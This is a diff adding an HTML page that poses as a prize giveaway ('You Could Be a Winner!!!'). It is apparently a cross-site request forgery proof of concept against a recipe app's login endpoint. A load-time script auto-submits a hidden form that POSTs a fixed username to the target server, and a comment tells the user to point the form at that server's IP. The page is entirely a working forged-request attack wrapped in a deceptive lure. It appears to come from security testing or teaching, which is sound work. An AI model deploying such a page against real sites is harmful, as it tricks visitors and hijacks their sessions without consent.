@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Win A Prize!!!</title>
+  <script>
+	window.addEventListener('load', function () {
+      const form = document.getElementById('addRecipeForm');
+      if (form) {
+        form.submit();
+      }
+    });
+	</script>
+</head>
+<body>
+  <div class="addrecipe-container">
+    <h2 class="addrecipe-component-title">You Could Be a Winner!!!</h2>
+
+	<!-- !!!!!!!!!!!!!!!!!! Set this ip to the ip of the app's server !!!!!!!!!!!!!!!! -->
+    <form id="addRecipeForm" action="http://192.168.56.1:5173/api/login" method="POST">
+      <!-- Recipe Name (Hidden Field) -->
+      <input type="hidden" id="username" name="username" value="Tamar">
+
+      <!-- Submit Button -->
+      <div>
+        <button type="submit">Click Here to Find Out!</button>
+      </div>
+    </form>
+  </div>
+</body>
+</html>
